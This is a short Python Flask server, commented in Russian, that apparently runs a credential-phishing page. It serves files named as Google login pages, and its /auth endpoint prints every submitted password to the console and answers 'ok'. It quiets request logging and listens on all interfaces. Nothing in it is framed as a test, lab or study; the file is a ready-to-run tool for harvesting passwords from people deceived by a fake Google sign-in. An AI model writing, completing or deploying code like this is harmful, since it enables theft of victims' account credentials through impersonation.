from flask import Flask, request, jsonify, send_file, make_response
from flask_cors import CORS
import logging
import sys
import os

# Отключаем лишние логи
logging.getLogger('werkzeug').setLevel(logging.ERROR)
sys.stdout = sys.__stdout__

app = Flask(__name__)
CORS(app)

@app.route('/auth', methods=['POST'])
def auth():
    data = request.form
    password = data.get('password')
    print(f"🔐 Пароль: {password}")
    return jsonify({"status": "ok"})

@app.route("/")
def index():
    return send_file("target/login.html")

@app.route("/login")
def login():
    return send_file("target/Google.html")

if __name__ == "__main__":
    # Запускаем сервер на всех интерфейсах и нужном порту
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
